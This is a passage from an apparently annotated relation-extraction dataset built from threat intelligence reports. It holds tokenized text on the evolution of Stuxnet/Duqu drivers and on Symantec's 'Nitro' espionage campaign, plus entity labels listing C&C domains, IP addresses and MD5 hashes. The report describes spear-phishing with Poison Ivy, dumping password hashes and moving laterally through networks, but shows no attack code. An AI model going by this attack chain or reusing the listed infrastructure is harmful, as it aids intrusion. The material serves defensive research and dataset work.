"function", "which", "creates", "stubs", "to", "inject", "PNF", "DLL", "into", "processes", ":"], ["The", "mrxcls", "version", "uses", "a", "stub", "with", "a", "total", "size", "of", "6332", "bytes", "."], ["The", "jmidebs", "and", "Duqu", "drivers", "use", "stubs", "with", "a", "total", "size", "of", "7061", "bytes", "."], ["The", "code", "used", "in", "the", "stub", "modules", "for", "these", "drivers", "is", "identical", ",", "but", "has", "different", "compilation", "dates", "."], ["API", "Mrxcls", "(", "Stuxnet", ")"], ["RtlGetVersion", ",", "KeAreAllApcsDisabled", ",", "obtained", "by", "calling", "MmGetSystemRoutineAddress", "Injected", "6332", "EXE"], ["Jan", "01", "22:53:23", "2009", "jmidebs", "Duqu", "RtlGetVersion", ",", "KeAreAllApcsDisabled", ",", "PsGetProcessSessionId", ",", "PsGetProcessPeb", "obtained", "with", "their", "own", "functions", "Similar", "to", "jmidebs", ",", "4", "more", "functions", "added", "7061"], ["Jul", "14", "13:05:31", "2010", "7061", "Different", "compilation", "dates", "Driver", "evolution"], ["We", "have", "mapped", "out", "the", "links", "between", "known", "drivers", "whose", "evolution", "and", "key", "stages", "of", "development", "are", "easy", "to", "track", "."], ["Driver", "evolution", "from", "2008", "to", "2011", "rndismpc.sys", ",", "rtniczw.sys", "and", "jmidebs.sys"], ["As", "you", "can", "see", "from", "the", "diagram", ",", "it", "is", "not", "known", "which", "malicious", "program", "interacted", "with", "the", "following", "three", "drivers", ":", "rndismpc.sys", ",", "rtniczw.sys", "and", "jmidebs.sys", "."], ["The", "obvious", "question", "would", "be", ":", "were", "they", "used", "in", "Stuxnet", "?"], ["In", "our", "opinion", ",", "the", "answer", "would", "have", "to", "be", "'", "no", "'", "."], ["First", "of", "all", ",", "if", "they", "had", "been", "used", "in", "Stuxnet", ",", "they", "would", "have", "left", "a", "far", "bigger", "footprint", "than", "the", "individual", "cases", "we", "have", "detected", "."], ["Secondly", ",", "there", "has", "n't", "been", "a", "single", "variant", "of", "Stuxnet", "that", "is", "capable", "of", "interacting", "with", "these", "drivers", "."], ["The", "file", "rtniczw.sys", "was", "signed", "on", "18", "March", "2010", ",", "but", "on", "14", "April", "2010", "the", "Stuxnet", "authors", "created", "a", "new", "variant", "of", "the", "worm", "that", "made", "use", "of", "the", "\"", "reference", "\"", "mrxcls.sys", "."], ["It", "is", "obvious", "that", "rtniczw.sys", "was", "intended", "for", "some", "other", "use", "."], ["The", "same", "can", "be", "said", "of", "jmidebs.sys", "."], ["We", "believe", "that", "the", "three", "drivers", "are", "only", "indirectly", "related", "to", "Stuxnet", "and", "can", "safely", "be", "erased", "from", "Stuxnet", "history", "."], ["Then", "there", "is", "another", "question", ":", "could", "these", "drivers", "have", "been", "used", "with", "Duqu", "?"], ["There", "is", "no", "clear", "-", "cut", "answer", "here", "."], ["Although", "all", "known", "variations", "of", "Duqu", "are", "from", "the", "period", "November", "2010", "-", "October", "2011", ",", "we", "believe", "there", "were", "earlier", "versions", "of", "the", "Trojan", "spy", "created", "to", "steal", "information", "."], ["The", "three", "drivers", "in", "question", "could", "easily", "have", "been", "used", "in", "early", "versions", "of", "Duqu", "or", "with", "other", "Trojans", "based", "on", "the", "Stuxnet", "/", "Duqu", "platform", "."], ["Like", "Duqu", ",", "those", "Trojans", "were", "most", "probably", "used", "in", "targeted", "attacks", "before", "the", "appearance", "of", "Stuxnet", "(", "dating", "back", "to", "at", "least", "2008", ")", ",", "both", "while", "it", "was", "active", "and", "after", "its", "C&C", "was", "shut", "down", "."], ["They", "were", "likely", "to", "have", "been", "parallel", "projects", ",", "and", "Stuxnet", "was", "subsequently", "based", "on", "that", "accumulated", "experience", "and", "the", "code", "that", "had", "already", "been", "written", "."], ["It", "seems", "highly", "unlikely", "that", "this", "was", "the", "only", "project", "that", "its", "authors", "were", "involved", "in", "."], ["The", "driver", "creation", "process", "Let", "'s", "try", "to", "imagine", "what", "the", "driver", "creation", "process", "looks", "like", "."], ["A", "few", "times", "a", "year", "the", "authors", "compile", "a", "new", "version", "of", "a", "driver", "file", ",", "creating", "a", "reference", "file", "."], ["The", "primary", "purpose", "of", "this", "file", "is", "to", "load", "and", "execute", "a", "main", "module", ",", "which", "is", "created", "separately", "."], ["It", "could", "be", "Stuxnet", ",", "or", "Duqu", "or", "something", "else", "."], ["When", "it", "is", "necessary", "to", "use", "a", "driver", "for", "a", "new", "module", ",", "the", "authors", "use", "a", "dedicated", "program", "to", "modify", "information", "in", "the", "driver", "'s", "\"", "reference", "\"", "file", ",", "i.e.", "its", "name", "and", "service", "information", "as", "well", "as", "the", "registry", "key", "and", "its", "value", "."], ["It", "'s", "important", "to", "note", "that", "they", "tweak", "ready", "-", "made", "files", "and", "do", "n't", "create", "a", "new", "one", "from", "scratch", "."], ["This", "means", "they", "can", "make", "as", "many", "different", "driver", "files", "as", "they", "like", ",", "each", "having", "exactly", "the", "same", "functionality", "and", "creation", "date", "."], ["Depending", "on", "the", "aim", "of", "the", "attack", "and", "the", "Trojan", "'s", "victim", ",", "several", "driver", "files", "can", "then", "be", "signed", "with", "legitimate", "digital", "certificates", "whose", "origins", "remain", "unknown", "."], ["Conclusion"], ["From", "the", "data", "we", "have", "at", "our", "disposal", ",", "we", "can", "say", "with", "a", "fair", "degree", "of", "certainty", "that", "the", "\"", "Tilded", "\"", "platform", "was", "created", "around", "the", "end", "of", "2007", "or", "early", "2008", "before", "undergoing", "its", "most", "significant", "changes", "in", "summer", "/", "autumn", "2010", "."], ["Those", "changes", "were", "sparked", "by", "advances", "in", "code", "and", "the", "need", "to", "avoid", "detection", "by", "antivirus", "solutions", "."], ["There", "were", "a", "number", "of", "projects", "involving", "programs", "based", "on", "the", "\"", "Tilded", "\"", "platform", "throughout", "the", "period", "2007", "-", "2011", "."], ["Stuxnet", "and", "Duqu", "are", "two", "of", "them", "there", "could", "have", "been", "others", ",", "which", "for", "now", "remain", "unknown", "."], ["The", "platform", "continues", "to", "develop", ",", "which", "can", "only", "mean", "one", "thing", "-", "we", "'re", "likely", "to", "see", "more", "modifications", "in", "the", "future", "."]]}, {"vertexSet": [[{"name": "design documents", "pos": [14, 16], "sent_id": 10, "type": "BusinessInformation"}], [{"name": "formulas", "pos": [17, 18], "sent_id": 10, "type": "BusinessInformation"}], [{"name": "manufacturing processes", "pos": [20, 22], "sent_id": 10, "type": "BusinessInformation"}], [{"name": "Nitro", "pos": [17, 18], "sent_id": 14, "type": "Campaign"}], [{"name": "July 2011", "pos": [6, 8], "sent_id": 15, "type": "Time"}], [{"name": "September 2011", "pos": [11, 13], "sent_id": 15, "type": "Time"}], [{"name": "Command and Control", "pos": [9, 12], "sent_id": 16, "type": "Exploit"}], [{"name": "C&C", "pos": [13, 14], "sent_id": 16, "type": "Exploit"}], [{"name": "April 2011", "pos": [22, 24], "sent_id": 16, "type": "Time"}], [{"name": "NGOs", "pos": [14, 15], "sent_id": 20, "type": "ExploitTargetObject"}], [{"name": "Fortune 100", "pos": [6, 8], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "PoisonIvy", "pos": [14, 15], "sent_id": 42, "type": "TrojanHorse"}], [{"name": "dumped hashes", "pos": [16, 18], "sent_id": 46, "type": "Exploit"}], [{"name": "Nitro", "pos": [1, 2], "sent_id": 53, "type": "Campaign"}], [{"name": "US", "pos": [9, 10], "sent_id": 55, "type": "Country"}], [{"name": "Bangladesh", "pos": [11, 12], "sent_id": 55, "type": "Country"}], [{"name": "UK", "pos": [14, 15], "sent_id": 55, "type": "Country"}], [{"name": "Denmark", "pos": [10, 11], "sent_id": 60, "type": "Country"}], [{"name": "Belgium", "pos": [2, 3], "sent_id": 61, "type": "Country"}], [{"name": "Netherlands", "pos": [5, 6], "sent_id": 61, "type": "Country"}], [{"name": "Italy", "pos": [0, 1], "sent_id": 62, "type": "Country"}], [{"name": "Japan", "pos": [2, 3], "sent_id": 62, "type": "Country"}], [{"name": "Saudi Arabia", "pos": [4, 6], "sent_id": 62, "type": "Country"}], [{"name": "Nitro", "pos": [5, 6], "sent_id": 64, "type": "Campaign"}], [{"name": "Hebei", "pos": [15, 16], "sent_id": 72, "type": "Region"}], [{"name": "Covert Grove", "pos": [8, 10], "sent_id": 73, "type": "Attacker"}], [{"name": "China", "pos": [31, 32], "sent_id": 75, "type": "Country"}], [{"name": "Covert Grove", "pos": [6, 8], "sent_id": 84, "type": "Attacker"}], [{"name": "Poison Ivy", "pos": [13, 15], "sent_id": 87, "type": "TrojanHorse"}], [{"name": "RAT", "pos": [1, 2], "sent_id": 88, "type": "Malware"}], [{"name": "poisonivy-rat.com", "pos": [6, 7], "sent_id": 89, "type": "Indicator"}], [{"name": "AntiVirus_update_package.7z", "pos": [2, 3], "sent_id": 99, "type": "Indicator"}], [{"name": "acquisition.7z", "pos": [3, 4], "sent_id": 99, "type": "Indicator"}], [{"name": "offer.7z", "pos": [0, 1], "sent_id": 100, "type": "Indicator"}], [{"name": "update_flashplayer10ax.7z", "pos": [1, 2], "sent_id": 100, "type": "Indicator"}], [{"name": "%Temp%\\happiness.txt", "pos": [10, 12], "sent_id": 107, "type": "Indicator"}], [{"name": "%Temp%\\xxxx.exe", "pos": [1, 3], "sent_id": 108, "type": "Indicator"}], [{"name": "happiness.txt", "pos": [4, 5], "sent_id": 110, "type": "Indicator"}], [{"name": "Camellia", "pos": [13, 14], "sent_id": 115, "type": "MalwareCharacteristics"}], [{"name": "C:\\Documents and Settings\\Administrator\\\u684c\u9762\\\u65b0\u5efa\u6587\u4ef6\u5939\\\u8bfb\u53d6\u6587\u4ef6\\Release\\\u8bfb\u53d6\u6587\u4ef6.pdb", "pos": [11, 14], "sent_id": 119, "type": "Indicator"}], [{"name": "Backdoor.Odivy", "pos": [9, 12], "sent_id": 122, "type": "TrojanHorse"}], [{"name": "204.74.215.58", "pos": [20, 21], "sent_id": 125, "type": "Address"}], [{"name": "antivirus-groups.com", "pos": [36, 37], "sent_id": 125, "type": "Indicator"}], [{"name": "pr[REMOVED].noip.org", "pos": [2, 3], "sent_id": 127, "type": "Indicator"}], [{"name": "173.252.207.71", "pos": [3, 4], "sent_id": 127, "type": "Address"}], [{"name": "173.252.205.36", "pos": [5, 6], "sent_id": 127, "type": "Address"}], [{"name": "173.252.205.37", "pos": [7, 8], "sent_id": 127, "type": "Address"}], [{"name": "173.252.205.64", "pos": [9, 10], "sent_id": 127, "type": "Address"}], [{"name": "antivirus-groups.com", "pos": [10, 11], "sent_id": 127, "type": "Indicator"}], [{"name": "74.82.166.205", "pos": [11, 12], "sent_id": 127, "type": "Address"}], [{"name": "204.74.215.58", "pos": [13, 14], "sent_id": 127, "type": "Address"}], [{"name": "domain.rm6.org", "pos": [14, 15], "sent_id": 127, "type": "Indicator"}], [{"name": "216.131.95.22", "pos": [15, 16], "sent_id": 127, "type": "Address"}], [{"name": "222.255.28.27", "pos": [17, 18], "sent_id": 127, "type": "Address"}], [{"name": "anti-virus.sytes.net", "pos": [0, 1], "sent_id": 129, "type": "Indicator"}], [{"name": "173.252.205.36", "pos": [1, 2], "sent_id": 129, "type": "Address"}], [{"name": "173.252.205.37", "pos": [3, 4], "sent_id": 129, "type": "Address"}], [{"name": "173.252.205.64", "pos": [5, 6], "sent_id": 129, "type": "Address"}], [{"name": "Backdoor.Sogu", "pos": [16, 19], "sent_id": 130, "type": "Malware"}], [{"name": "Sogu gang", "pos": [1, 3], "sent_id": 134, "type": "Attacker"}], [{"name": "091457444b7e7899c242c5125ddc0571", "pos": [2, 3], "sent_id": 147, "type": "MD5"}], [{"name": "6e99585c3fbd4f3a55bd8f604cb35f38", "pos": [0, 1], "sent_id": 148, "type": "MD5"}], [{"name": "07e266f7fb3c36a1f3a5c5d2d229a478", "pos": [1, 2], "sent_id": 148, "type": "MD5"}], [{"name": "17e7022496d8092d3ca76ae9524a7260", "pos": [0, 1], "sent_id": 149, "type": "MD5"}], [{"name": "2f37912e7cb6e5c478e6dc3d0e381a24", "pos": [0, 1], "sent_id": 150, "type": "MD5"}], [{"name": "5d075e9536c5494745135c1176981c96", "pos": [0, 1], "sent_id": 151, "type": "MD5"}], [{"name": "76000c77ea9a214f5b2ae8cc387809db", "pos": [0, 1], "sent_id": 152, "type": "MD5"}], [{"name": "a98d2c90b9494fc885c7cd35d43666ea", "pos": [0, 1], "sent_id": 153, "type": "MD5"}], [{"name": "c128c40bd8acb282288e8138352ce4e1", "pos": [1, 2], "sent_id": 153, "type": "MD5"}], [{"name": "cab66da82594ff5266ac8dd89e3d1539", "pos": [2, 3], "sent_id": 153, "type": "MD5"}], [{"name": "70fcb3446fce23b18d9a12b2ed911e52", "pos": [3, 4], "sent_id": 153, "type": "MD5"}], [{"name": "c53c93a445d751387eb167e5a2b901da", "pos": [4, 5], "sent_id": 153, "type": "MD5"}], [{"name": "dd5715cb3b0cdddbe131f03cc08f0f57", "pos": [5, 6], "sent_id": 153, "type": "MD5"}], [{"name": "0f54a9757f1a2fef2b04b776714a7546", "pos": [6, 7], "sent_id": 153, "type": "MD5"}], [{"name": "37f70717f549f1938e5785527e56978d", "pos": [7, 8], "sent_id": 153, "type": "MD5"}], [{"name": "31346e5b39ddb095d76071ac86da4c2e", "pos": [8, 9], "sent_id": 153, "type": "MD5"}], [{"name": "330ddac1f605ff8abf60880c584ed797", "pos": [0, 1], "sent_id": 154, "type": "MD5"}], [{"name": "457a2a8d0784e9fc8e49f6ef60f7f29e", "pos": [0, 1], "sent_id": 155, "type": "MD5"}], [{"name": "87aeec7f7c4ec1b6dc5e6c39b28d8273", "pos": [0, 1], "sent_id": 156, "type": "MD5"}], [{"name": "8d36fd85d9c7d1f4bb170a28cc23498a", "pos": [1, 2], "sent_id": 156, "type": "MD5"}], [{"name": "de7e293aa9c4d849dc080f3e87573b24", "pos": [0, 1], "sent_id": 157, "type": "MD5"}], [{"name": "64a4ad90a55e7b6c30c46135435f50a2", "pos": [1, 2], "sent_id": 157, "type": "MD5"}]], "labels": [{"r": "P33", "h": 3, "t": 5, "evidence": [14, 15]}, {"r": "P33", "h": 3, "t": 4, "evidence": [14, 15]}, {"r": "P22", "h": 3, "t": 7, "evidence": [14, 16]}, {"r": "P22", "h": 3, "t": 6, "evidence": [14, 16]}, {"r": "P33", "h": 3, "t": 8, "evidence": [14, 16]}, {"r": "P27", "h": 3, "t": 9, "evidence": [14, 20]}, {"r": "P27", "h": 3, "t": 10, "evidence": [14, 29]}, {"r": "P22", "h": 3, "t": 11, "evidence": [14, 42]}, {"r": "P22", "h": 13, "t": 12, "evidence": [46, 53]}, {"r": "P32", "h": 13, "t": 14, "evidence": [53, 55]}, {"r": "P32", "h": 13, "t": 15, "evidence": [53, 55]}, {"r": "P32", "h": 13, "t": 16, "evidence": [53, 55]}, {"r": "P32", "h": 23, "t": 22, "evidence": [62, 64]}, {"r": "P32", "h": 23, "t": 21, "evidence": [62, 64]}, {"r": "P32", "h": 23, "t": 20, "evidence": [62, 64]}, {"r": "P32", "h": 23, "t": 19, "evidence": [61, 64]}, {"r": "P32", "h": 23, "t": 18, "evidence": [61, 64]}, {"r": "P32", "h": 23, "t": 17, "evidence": [60, 64]}, {"r": "P23", "h": 27, "t": 28, "evidence": [84, 87]}, {"r": "P2", "h": 27, "t": 29, "evidence": [84, 88]}, {"r": "P21", "h": 30, "t": 28, "evidence": [87, 89]}, {"r": "P21", "h": 31, "t": 28, "evidence": [87, 99]}, {"r": "P21", "h": 32, "t": 28, "evidence": [87, 99]}, {"r": "P21", "h": 33, "t": 28, "evidence": [87, 100]}, {"r": "P21", "h": 34, "t": 28, "evidence": [87, 100]}, {"r": "P21", "h": 41, "t": 40, "evidence": [122, 125]}, {"r": "P21", "h": 42, "t": 40, "evidence": [122, 125]}, {"r": "P21", "h": 35, "t": 40, "evidence": [107, 122]}, {"r": "P21", "h": 36, "t": 40, "evidence": [108, 122]}, {"r": "P21", "h": 37, "t": 40, "evidence": [110, 122]}, {"r": "P13", "h": 40, "t": 38, "evidence": [115, 122]}, {"r": "P21", "h": 39, "t": 40, "evidence": [119, 122]}, {"r": "P2", "h": 59, "t": 58, "evidence": [130, 134]}, {"r": "P21", "h": 43, "t": 28, "evidence": [87, 127]}, {"r": "P21", "h": 48, "t": 28, "evidence": [87, 127]}, {"r": "P21", "h": 51, "t": 28, "evidence": [87, 127]}, {"r": "P21", "h": 54, "t": 28, "evidence": [87, 129]}, {"r": "P21", "h": 60, "t": 28, "evidence": [87, 147]}, {"r": "P21", "h": 61, "t": 28, "evidence": [87, 148]}, {"r": "P21", "h": 62, "t": 28, "evidence": [87, 148]}, {"r": "P21", "h": 63, "t": 28, "evidence": [87, 149]}, {"r": "P21", "h": 64, "t": 28, "evidence": [87, 150]}, {"r": "P21", "h": 65, "t": 28, "evidence": [87, 151]}, {"r": "P21", "h": 66, "t": 28, "evidence": [87, 152]}, {"r": "P21", "h": 67, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 68, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 69, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 70, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 71, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 72, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 73, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 74, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 75, "t": 28, "evidence": [87, 153]}, {"r": "P21", "h": 76, "t": 28, "evidence": [87, 154]}, {"r": "P21", "h": 77, "t": 28, "evidence": [87, 155]}, {"r": "P21", "h": 78, "t": 28, "evidence": [87, 156]}, {"r": "P21", "h": 79, "t": 28, "evidence": [87, 156]}, {"r": "P21", "h": 80, "t": 28, "evidence": [87, 157]}, {"r": "P21", "h": 81, "t": 28, "evidence": [87, 157]}], "title": "201110SymantecNitro", "sents": [["Security", "Response", "The", "Nitro", "Attacks"], ["Stealing", "Secrets", "from", "the", "Chemical", "Industry", "Eric", "Chien", "and", "Gavin", "O\u2019Gorman", "Contents", "Introduction", "........................................................"], ["1", "Targets", "................................................................", "1", "Attack", "methodology", "...........................................", "2"], ["Geographic", "Spread", "............................................"], ["3", "Attribution", "...........................................................", "4"], ["Technical", "details", ".................................................", "4"], ["Delivery", ".........................................................", "4", "Threat", "details", "................................................", "5"], ["Command", "and", "Control", "(", "C&C", ")", ".......................", "6", "Related", "Attacks", "...................................................", "6"], ["Summary", ".............................................................", "6", "Appendix", ".............................................................", "7", "Introduction"], ["This", "document", "discusses", "a", "recent", "targeted", "attack", "campaign", "directed", "primarily", "at", "private", "companies", "involved", "in", "the", "research", ",", "development", ",", "and", "manufacture", "of", "chemicals", "and", "advanced", "materials", "."], ["The", "goal", "of", "the", "attackers", "appears", "to", "be", "to", "collect", "intellectual", "property", "such", "as", "design", "documents", ",", "formulas", ",", "and", "manufacturing", "processes", "."], ["In", "addition", ",", "the", "same", "attackers", "appear", "to", "have", "a", "lengthy", "operation", "history", "including", "attacks", "on", "other", "industries", "and", "organizations", "."], ["Attacks", "on", "the", "chemical", "industry", "are", "merely", "their", "latest", "attack", "wave", "."], ["As", "part", "of", "our", "investigations", ",", "we", "were", "also", "able", "to", "identify", "and", "contact", "one", "of", "the", "attackers", "to", "try", "and", "gain", "insights", "into", "the", "motivations", "behind", "these", "attacks", "."], ["As", "the", "pattern", "of", "chemical", "industry", "targets", "emerged", ",", "we", "internally", "code", "-", "named", "the", "attack", "campaign", "Nitro", "."], ["The", "attack", "wave", "started", "in", "late", "July", "2011", "and", "continued", "into", "midSeptember", "2011", "."], ["However", ",", "artifacts", "of", "the", "attack", "wave", "such", "as", "Command", "and", "Control", "(", "C&C", ")", "servers", "are", "also", "used", "as", "early", "as", "April", "2011", "and", "against", "targets", "outside", "the", "chemical", "industry", "."], ["The", "purpose", "of", "the", "attacks", "appears", "to", "be", "industrial", "espionage", ",", "collecting", "intellectual", "property", "for", "competitive", "advantage", "."], ["Targets"], ["The", "attackers", "have", "changed", "their", "targets", "over", "time", "."], ["From", "late", "April", "to", "early", "May", ",", "the", "attackers", "focused", "on", "human", "rights", "related", "NGOs", "."], ["They", "then", "moved", "on", "to", "the", "motor", "industry", "in", "late", "May.", "From", "June", "until", "midJuly", "no", "activity", "was", "detected", "."], ["At", "this", "point", ",", "the", "current", "attack", "campaign", "against", "the", "chemical", "industry", "began", "."], ["This", "particular", "attack", "has", "lasted", "much", "longer", "than", "previous", "attacks", ",", "spanning", "two", "and", "a", "half", "months", "."], ["Security", "Response", "The", "Nitro", "Attacks", ":"], ["Stealing", "Secrets", "from", "the", "Chemical", "Industry", "A", "total", "of", "29", "companies", "in", "the", "chemical", "sector", "were", "confirmed", "to", "be", "targeted", "in", "this", "attack", "wave", "and", "another", "19", "in", "various", "other", "sectors", ",", "primarily", "the", "defense", "sector", ",", "were", "seen", "to", "be", "affected", "as", "well", "."], ["These", "48", "companies", "are", "the", "minimum", "number", "of", "companies", "targeted", "and", "likely", "other", "companies", "were", "also", "targeted", "."], ["In", "a", "recent", "two", "week", "period", ",", "101", "unique", "IP", "addresses", "contacted", "a", "command", "and", "control", "server", "with", "traffic", "consistent", "with", "an", "infected", "machine", "."], ["These", "IPs", "represented", "52", "different", "unique", "Internet", "Service", "Providers", "or", "organizations", "in", "20", "countries", "."], ["Companies", "affected", "include", ":", "\u2022", "Multiple", "Fortune", "100", "companies", "involved", "in", "research", "and", "development", "of", "chemical", "compounds", "and", "advanced", "materials", "."], ["\u2022"], ["Companies", "that", "develop", "advanced", "materials", "primarily", "for", "military", "vehicles", "."], ["\u2022"], ["Companies", "involved", "in", "developing", "manufacturing", "infrastructure", "for", "the", "chemical", "and", "advanced", "materials", "industry", "."], ["Attack", "methodology"], ["The", "attackers", "first", "researched", "desired", "targets", "and", "then", "sent", "an", "email", "specifically", "to", "the", "target", "."], ["Each", "organization", "typically", "only", "saw", "a", "handful", "of", "employees", "at", "the", "receiving", "end", "of", "these", "emails", "."], ["However", ",", "in", "one", "organization", "almost", "500", "recipients", "received", "a", "mail", ",", "while", "in", "two", "other", "organizations", ",", "more", "than", "100", "were", "selected", "."], ["While", "the", "attackers", "used", "different", "pretexts", "when", "sending", "these", "malicious", "emails", ",", "two", "methodologies", "stood", "out", "."], ["First", ",", "when", "a", "specific", "recipient", "was", "targeted", ",", "the", "mails", "often", "purported", "to", "be", "meeting", "invitations", "from", "established", "business", "partners", "."], ["Secondly", ",", "when", "the", "emails", "were", "being", "sent", "to", "a", "broad", "set", "of", "recipients", ",", "the", "mails", "purported", "to", "be", "a", "necessary", "security", "update", "."], ["The", "emails", "then", "contained", "an", "attachment", "that", "was", "either", "an", "executable", "that", "appeared", "to", "be", "a", "text", "file", "based", "on", "the", "file", "name", "and", "icon", ",", "or", "a", "password", "-", "protected", "archive", "containing", "an", "executable", "file", "with", "the", "password", "provided", "in", "the", "email", "."], ["In", "both", "cases", ",", "the", "executable", "file", "was", "a", "self", "-", "extracting", "executable", "containing", "PoisonIvy", ",", "a", "common", "backdoor", "Trojan", "developed", "by", "a", "Chinese", "speaker", "."], ["When", "the", "recipient", "attempted", "to", "open", "the", "attachment", ",", "they", "would", "inadvertently", "execute", "the", "file", ",", "causing", "PoisonIvy", "to", "be", "installed", "."], ["Once", "PoisonIvy", "was", "installed", ",", "it", "contacted", "a", "C&C", "server", "on", "TCP", "port", "80", "using", "an", "encrypted", "communication", "protocol", "."], ["Using", "the", "C&C", "server", ",", "the", "attackers", "then", "instructed", "the", "compromised", "computer", "to", "provide", "the", "infected", "computer", "\u2019s", "IP", "address", ",", "the", "names", "of", "all", "other", "computers", "in", "the", "workgroup", "or", "domain", ",", "and", "dumps", "of", "Windows", "cached", "password", "hashes", "."], ["By", "using", "access", "to", "additional", "computers", "through", "the", "currently", "logged", "on", "user", "or", "cracked", "passwords", "through", "dumped", "hashes", ",", "the", "attackers", "then", "began", "traversing", "the", "network", "infecting", "additional", "computers", "."], ["Typically", ",", "their", "primary", "goal", "is", "to", "obtain", "domain", "administrator", "credentials", "and/or", "gain", "access", "to", "a", "system", "storing", "intellectual", "property", "."], ["Domain", "administrator", "credentials", "make", "it", "easier", "for", "the", "attacker", "to", "find", "servers", "hosting", "the", "desired", "intellectual", "property", "and", "gain", "access", "to", "the", "sensitive", "materials", "."], ["The", "attackers", "may", "have", "also", "downloaded", "and", "installed", "additional", "tools", "to", "penetrate", "the", "network", "further", "."], ["While", "the", "behavior", "of", "the", "attackers", "differs", "slightly", "in", "each", "compromise", ",", "generally", "once", "the", "attackers", "have", "identified", "the", "desired", "intellectual", "property", ",", "they", "copy", "the", "content", "to", "archives", "on", "internal", "systems", "they", "use", "as", "internal", "staging", "servers", "."], ["This", "content", "is", "then", "uploaded", "to", "a", "remote", "site", "outside", "of", "the", "compromised", "organization", "completing", "the", "attack", "."], ["Page", "2"], ["The", "Nitro", "Attacks", ":", "Stealing", "Secrets", "from", "the", "Chemical", "Industry", "Security", "Response", "Geographic", "Spread", "Figure", "1", "shows", "the", "location", "of", "infected", "computers", "."], ["This", "data", "is", "derived", "from", "the", "IP", "addresses", "of", "machines", "connecting", "back", "to", "the", "command", "and", "control", "server", "."], ["The", "majority", "of", "infected", "machines", "are", "located", "in", "the", "US", ",", "Bangladesh", "and", "the", "UK", ";", "however", ",", "overall"], ["there", "is", "wide", "geographical", "spread", "of", "infections", "."], ["Figure", "1", "Geographic", "location", "of", "infected", "computers", "Figure", "2", "shows", "the", "country", "of", "origin", "of", "the", "organizations", "targeted", "by", "these", "attacks", "."], ["While", "the", "US", "and", "UK", "again", "figure", "highly", "here", ",", "overall", "the", "geographical", "spread", "is", "different", "."], ["This", "means", "that", "the", "infected", "computers", "are", "rarely", "located", "within", "the", "organizations", "\u2019", "headquarters", "or", "country", "of", "origin", "."], ["Figure", "2", "Country", "of", "origin", "of", "targeted", "organizations", "*", "2", "Denmark", "UK", "5"], ["USA", "12", "Belgium", "1", "1", "Netherlands", "1"], ["Italy", "1", "Japan", "1", "Saudi", "Arabia", "*"], ["Additional", "confirmed", "infections", "exist", ";", "however", ",", "they", "did", "not", "contact", "the", "command", "and", "control", "server", "during", "the", "two", "-", "week", "period", "we", "were", "monitoring", "it", "."], ["Page", "3", "Security", "Response", "The", "Nitro", "Attacks", ":", "Stealing", "Secrets", "from", "the", "Chemical", "Industry"], ["There", "are", "two", "possible", "explanations", "for", "this", ":", "\u2022"], ["The", "attackers", "are", "targeting", "sites", ",", "or", "individuals", "in", "certain", "sites", ",", "which", "they", "know", "have", "access", "to", "certain", "data", "that", "is", "of", "interest", "to", "the", "attacker", "."], ["\u2022"], ["The", "attackers", "are", "targeting", "sites", "or", "individuals", "that", "they", "believe", "have", "less", "security", "measures", "in", "place", "and", "are", "therefore", "an", "easier", "access", "point", "into", "the", "victims", "\u2019", "networks", "."], ["We", "can", "conclude", "that", "the", "attackers", "are", "not", "targeting", "organizations", "in", "a", "particular", "country", "."], ["Attribution"], ["The", "attacks", "were", "traced", "back", "to", "a", "computer", "system", "that", "was", "a", "virtual", "private", "server", "(", "VPS", ")", "located", "in", "the", "United", "States", "."], ["However", ",", "the", "system", "was", "owned", "by", "a", "20", "-", "something", "male", "located", "in", "the", "Hebei", "region", "in", "China", "."], ["We", "internally", "have", "given", "him", "the", "pseudonym", "of", "Covert", "Grove", "based", "on", "a", "literal", "translation", "of", "his", "name", "."], ["He", "attended", "a", "vocational", "school", "for", "a", "short", "period", "of", "time", "specializing", "in", "network", "security", "and", "has", "limited", "work", "experience", ",", "most", "recently", "maintaining", "multiple", "network", "domains", "of", "the", "vocational", "school", "."], ["Covert", "Grove", "claimed", "to", "have", "the", "U.S.-based", "VPS", "for", "the", "sole", "purpose", "of", "using", "the", "VPS", "to", "log", "into", "the", "QQ", "instant", "message", "system", ",", "a", "popular", "instant", "messaging", "system", "in", "China", "."], ["By", "owning", "a", "VPS", ",", "he", "would", "have", "a", "static", "IP", "address", "."], ["He", "claims", "this", "was", "the", "sole", "purpose", "of", "the", "VPS", "."], ["And", "by", "having", "a", "static", "IP", "address", ",", "he", "could", "use", "a", "feature", "provided", "by", "QQ", "to", "restrict", "login", "access", "to", "particular", "IP", "addresses", "."], ["The", "VPS", "cost", "was", "RMB200", "(", "US$", "32", ")", "a", "month", "."], ["While", "possible", ",", "with", "an", "expense", "of", "RMB200", "a", "month", "for", "such", "protection", "and", "the", "usage", "of", "a", "US", "-", "based", "VPS", ",", "the", "scenario", "seems", "suspicious", "."], ["We", "were", "unable", "to", "recover", "any", "evidence", "the", "VPS", "was", "used", "by", "any", "other", "authorized", "or", "unauthorized", "users", "."], ["Further", ",", "when", "prompted", "regarding", "hacking", "skills", ",", "Covert", "Grove", "immediately", "provided", "a", "contact", "that", "would", "perform", "\u2018", "hacking", "for", "hire", "\u2019", "."], ["Whether", "this", "contact", "is", "merely", "an", "alias", "or", "a", "different", "individual", "has", "not", "been", "determined", "."], ["We", "are", "unable", "to", "determine", "if", "Covert", "Grove", "is", "the", "sole", "attacker", "or", "if", "he", "has", "a", "direct", "or", "only", "indirect", "role", "."], ["Nor", "are", "we", "able", "to", "definitively", "determine", "if", "he", "is", "hacking", "these", "targets", "on", "behalf", "of", "another", "party", "or", "multiple", "parties", "."], ["Technical", "details"], ["As", "mentioned", "above", ",", "the", "threat", "used", "to", "compromise", "the", "targeted", "networks", "is", "Poison", "Ivy", ",", "a", "Remote", "Access", "Tool"], ["(", "RAT", ")", "."], ["This", "application", "is", "freely", "available", "from", "poisonivy-rat.com", "."], ["It", "comes", "fully", "loaded", "with", "a", "number", "of", "plug", "-", "ins", "to", "give", "an", "attacker", "complete", "control", "of", "the", "compromised", "computer", "."], ["Delivery"], ["The", "method", "of", "delivery", "has", "changed", "over", "time", "as", "the", "attackers", "have", "changed", "targets", "."], 